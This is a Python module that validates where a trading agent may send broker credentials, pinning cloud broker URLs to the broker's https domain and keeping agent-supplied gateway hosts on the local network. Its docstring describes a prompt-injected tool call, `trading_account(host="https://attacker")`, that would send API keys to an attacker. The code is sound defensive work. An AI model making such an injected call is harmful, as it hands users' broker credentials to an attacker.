"""Where broker credentials may be sent, and which gateways an agent may name.

Signed broker requests carry the API key (and for OKX the passphrase) in
headers, so a configurable REST host is a credential-exfiltration knob: a
prompt-injected ``trading_account(host="https://attacker")`` would hand them
over. Cloud broker URLs are pinned to the broker's own domain over https,
whatever the source; agent/MCP-supplied gateway hosts (IBKR TWS, Futu OpenD)
must stay on the local network.
"""

from __future__ import annotations

import ipaddress
from urllib.parse import urlsplit

_LOCAL_GATEWAY_NAMES = frozenset({"localhost", "host.docker.internal"})


def is_broker_url(url: str, domains: tuple[str, ...]) -> bool:
    """Return True for an ``https`` URL whose host is one of ``domains`` or a subdomain.

    Args:
        url: Configured REST base URL.
        domains: The broker's registrable domains, e.g. ``("okx.com",)``.

    Returns:
        Whether credentials may be sent to this URL.
    """
    parts = urlsplit(url)
    host = (parts.hostname or "").lower().rstrip(".")
    if parts.scheme != "https" or parts.username or parts.password or not host:
        return False
    return any(host == domain or host.endswith("." + domain) for domain in domains)


def is_local_gateway_host(host: str) -> bool:
    """Return True for a loopback/private IP, ``localhost``, ``host.docker.internal`` or ``*.local``.

    Args:
        host: Bare host name or IP literal (IPv6 may be bracketed).

    Returns:
        Whether an agent-supplied gateway host stays on the local network.
    """
    name = host.strip().lower().rstrip(".")
    if name.startswith("[") and name.endswith("]"):
        name = name[1:-1]
    if name in _LOCAL_GATEWAY_NAMES or name.endswith(".local"):
        return True
    try:
        ip = ipaddress.ip_address(name)
    except ValueError:
        return False
    return (ip.is_loopback or ip.is_private) and not (ip.is_link_local or ip.is_unspecified)
